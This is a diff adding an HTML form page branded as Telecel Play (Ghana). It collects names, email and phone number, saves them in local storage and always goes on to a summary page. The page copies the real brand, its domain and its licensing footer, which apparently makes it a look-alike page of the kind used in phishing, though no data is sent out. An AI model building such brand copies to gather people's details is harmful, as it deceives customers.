@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telecel Play | Personal Details – play.telecel.com.gh</title>
+    <link rel="icon" href="https://play.telecel.com.gh/favicon.ico" type="image/x-icon">
+    <meta name="theme-color" content="#E30613">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f8f9fc;
+            color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: clamp(16px, 3vw, 24px);
+        }
+        
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: clamp(16px, 4vw, 24px);
+            text-align: center;
+            margin-bottom: clamp(16px, 4vw, 28px);
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            position: relative;
+        }
+        
+        .back-btn {
+            font-size: clamp(28px, 7vw, 32px);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #2c3e50;
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        
+        .logo {
+            font-size: clamp(32px, 8vw, 40px);
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .logo-telecel {
+            color: #E30613;
+        }
+        
+        .logo-play {
+            color: #0033A0;
+        }
+        
+        main {
+            flex: 1;
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+        }
+        
+        .form-card {
+            background: white;
+            border-radius: 20px;
+            padding: clamp(28px, 6vw, 40px) clamp(24px, 5vw, 32px);
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
+        }
+        
+        .form-title {
+            font-size: clamp(24px, 6vw, 32px);
+            font-weight: 700;
+            color: #1a1a1a;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            margin: 1.5rem auto 1rem;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 66.66%;
+            height: 100%;
+            background: linear-gradient(90deg, #E30613, #b71c1c);
+            border-radius: 4px;
+        }
+        
+        .step-text {
+            text-align: center;
+            color: #6c757d;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .form-group {
+            margin-bottom: 1.8rem;
+        }
+        
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 0.6rem;
+            font-size: 0.95rem;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: #fdfdfe;
+            transition: all 0.2s;
+        }
+        
+        .form-input:focus {
+            border-color: #E30613;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
+        }
+        
+        .invalid {
+            border-color: #dc3545 !important;
+            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15) !important;
+        }
+        
+        .field-error {
+            color: #dc3545;
+            font-size: 0.875rem;
+            margin-top: 0.4rem;
+            display: none;
+        }
+        
+        .name-group {
+            display: flex;
+            gap: 1.2rem;
+            margin-bottom: 1.8rem;
+        }
+        
+        .name-group>div {
+            flex: 1;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2.5rem;
+        }
+        
+        .prev-btn,
+        .next-btn {
+            flex: 1;
+            padding: 1.15rem;
+            border-radius: 12px;
+            font-size: 1.15rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .prev-btn {
+            background: #e2e8f0;
+            color: #475569;
+            border: none;
+        }
+        
+        .prev-btn:hover {
+            background: #cbd5e1;
+        }
+        
+        .next-btn {
+            background: linear-gradient(90deg, #E30613, #b71c1c);
+            color: white;
+            border: none;
+            box-shadow: 0 8px 24px rgba(227, 6, 19, 0.25);
+        }
+        
+        .next-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(227, 6, 19, 0.35);
+        }
+        
+        footer {
+            padding: clamp(20px, 5vw, 32px) 20px;
+            color: #adb5bd;
+            font-size: clamp(12px, 3vw, 14px);
+            text-align: center;
+            margin-top: auto;
+        }
+        
+        @media (min-width: 769px) {
+            body {
+                padding: 32px;
+            }
+            .form-card {
+                padding: 2.8rem 3.5rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo"><span class="logo-telecel">Telecel</span><span class="logo-play">Play</span></div>
+    </header>
+    <main>
+        <div class="form-card">
+            <h1 class="form-title">Personal Details</h1>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="step-text">Step 2 of 3</div>
+
+            <div class="name-group">
+                <div>
+                    <label class="form-label">First Name</label>
+                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Kwame">
+                    <div class="field-error" id="firstNameError">Please enter your first name.</div>
+                </div>
+                <div>
+                    <label class="form-label">Last Name</label>
+                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Mensah">
+                    <div class="field-error" id="lastNameError">Please enter your last name.</div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Email Address</label>
+                <input type="email" class="form-input" id="email" placeholder="e.g. kwame.mensah@example.com">
+                <div class="field-error" id="emailError">Please enter a valid email address.</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Phone Number</label>
+                <div style="display:flex; align-items:center; border:1px solid #ced4da; border-radius:10px; padding:0 1.2rem;" id="phoneGroup">
+                    <span style="color:#6c757d; font-weight:500; margin-right:0.8rem;">+233</span>
+                    <input type="tel" id="phone" placeholder="551234567" maxlength="9" style="flex:1; border:none; outline:none; padding:1rem 0; font-size:1rem; background:transparent;">
+                </div>
+                <div class="field-error" id="phoneError">Please enter a valid 9-digit phone number.</div>
+            </div>
+
+            <div class="btn-group">
+                <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+                <button class="next-btn" id="nextBtn">NEXT STEP</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        © 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play
+    </footer>
+
+    <script>
+        // ─────────────────────────────────────────────
+        // PREFILL FROM LOCAL STORAGE
+        // ─────────────────────────────────────────────
+        const fields = ['firstName', 'lastName', 'email', 'phone'];
+
+        fields.forEach(id => {
+            const value = localStorage.getItem(id);
+            if (value) {
+                document.getElementById(id).value = value;
+            }
+        });
+
+        // ─────────────────────────────────────────────
+        // ELEMENTS
+        // ─────────────────────────────────────────────
+        const firstNameInput = document.getElementById('firstName');
+        const lastNameInput = document.getElementById('lastName');
+        const emailInput = document.getElementById('email');
+        const phoneInput = document.getElementById('phone');
+
+        const firstNameError = document.getElementById('firstNameError');
+        const lastNameError = document.getElementById('lastNameError');
+        const emailError = document.getElementById('emailError');
+        const phoneError = document.getElementById('phoneError');
+
+        const phoneGroup = document.getElementById('phoneGroup');
+        const nextBtn = document.getElementById('nextBtn');
+
+        // ─────────────────────────────────────────────
+        // VALIDATION FUNCTIONS
+        // ─────────────────────────────────────────────
+        function validateName(input, errorEl) {
+            if (!input.value.trim()) {
+                input.classList.add('invalid');
+                errorEl.style.display = 'block';
+                return false;
+            }
+            return true;
+        }
+
+        function validateEmail() {
+            const email = emailInput.value.trim();
+            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                emailInput.classList.add('invalid');
+                emailError.style.display = 'block';
+                return false;
+            }
+            return true;
+        }
+
+        function validatePhone() {
+            const phone = phoneInput.value.trim();
+            if (!/^\d{9}$/.test(phone)) {
+                phoneGroup.classList.add('invalid');
+                phoneError.style.display = 'block';
+                return false;
+            }
+            return true;
+        }
+
+        // ─────────────────────────────────────────────
+        // RESET ERRORS
+        // ─────────────────────────────────────────────
+        function resetErrors() {
+            document.querySelectorAll('.form-input').forEach(el => {
+                el.classList.remove('invalid');
+            });
+
+            phoneGroup.classList.remove('invalid');
+
+            document.querySelectorAll('.field-error').forEach(el => {
+                el.style.display = 'none';
+            });
+        }
+
+        // ─────────────────────────────────────────────
+        // SCROLL TO FIRST ERROR
+        // ─────────────────────────────────────────────
+        function scrollToError() {
+            const firstInvalid = document.querySelector('.invalid');
+            if (firstInvalid) {
+                firstInvalid.scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'center'
+                });
+            }
+        }
+
+        // ─────────────────────────────────────────────
+        // SAVE DATA
+        // ─────────────────────────────────────────────
+        function saveData() {
+            localStorage.setItem('firstName', firstNameInput.value.trim());
+            localStorage.setItem('lastName', lastNameInput.value.trim());
+            localStorage.setItem('email', emailInput.value.trim());
+            localStorage.setItem('phone', phoneInput.value.trim());
+        }
+
+        // ─────────────────────────────────────────────
+        // BUTTON CLICK
+        // ─────────────────────────────────────────────
+        nextBtn.addEventListener('click', function() {
+            resetErrors();
+
+            const isFirstValid = validateName(firstNameInput, firstNameError);
+            const isLastValid = validateName(lastNameInput, lastNameError);
+            const isEmailValid = validateEmail();
+            const isPhoneValid = validatePhone();
+
+            // Always save (even if invalid)
+            saveData();
+
+            // Show errors but DO NOT block button completely
+            if (!isFirstValid || !isLastValid || !isEmailValid || !isPhoneValid) {
+                scrollToError();
+            }
+
+            // You can control navigation behavior here 👇
+
+            // OPTION 1: Always proceed (even if invalid)
+            window.location.href = 'summary.html';
+
+            // OPTION 2 (safer): only proceed if valid
+            // if (isFirstValid && isLastValid && isEmailValid && isPhoneValid) {
+            //     window.location.href = 'summary';
+            // }
+        });
+
+        // ─────────────────────────────────────────────
+        // LIVE INPUT CLEANUP (better UX)
+        // ─────────────────────────────────────────────
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', () => {
+                input.classList.remove('invalid');
+            });
+        });
+
+        phoneInput.addEventListener('input', () => {
+            phoneGroup.classList.remove('invalid');
+        });
+    </script>
+</body>
+
+</html>
